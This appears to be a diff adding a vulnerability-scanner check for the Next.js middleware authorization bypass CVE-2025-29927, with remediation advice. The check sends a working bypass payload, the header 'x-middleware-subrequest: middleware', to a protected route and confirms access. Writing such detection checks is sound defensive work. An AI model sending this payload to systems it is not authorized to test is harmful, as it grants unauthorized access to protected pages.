@@ -1,0 +1,34 @@
+id: nextjs-middleware-bypass-flow
+title: Next.js middleware authorization bypass (flow)
+cve: CVE-2025-29927
+cvss: 9.1
+severity: high
+category: web
+engine: module
+match:
+  service: nextjs
+  versions: ">=11.1.4 <15.2.3"
+# Approach B: the same two-request bypass the compiled module
+# (modules/nextjs_middleware_bypass) performs, expressed as a declarative flow
+# shipped in the signed catalog — no agent rebuild to distribute it. A protected
+# route is gated normally, but a request carrying x-middleware-subrequest skips
+# the middleware and is served, confirming the bypass.
+flow:
+  requests:
+    - id: baseline
+      method: GET
+      path: /dashboard
+    - id: bypass
+      method: GET
+      path: /dashboard
+      headers:
+        x-middleware-subrequest: middleware
+  confirm:
+    - "status(baseline) >= 400"
+    - "status(bypass) == 200"
+remediation: |
+  Upgrade Next.js to >=15.2.3 (or the patched release for your major). Do not
+  rely on middleware alone for authorization; enforce it in the route handler.
+references:
+  - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
+signature: stub
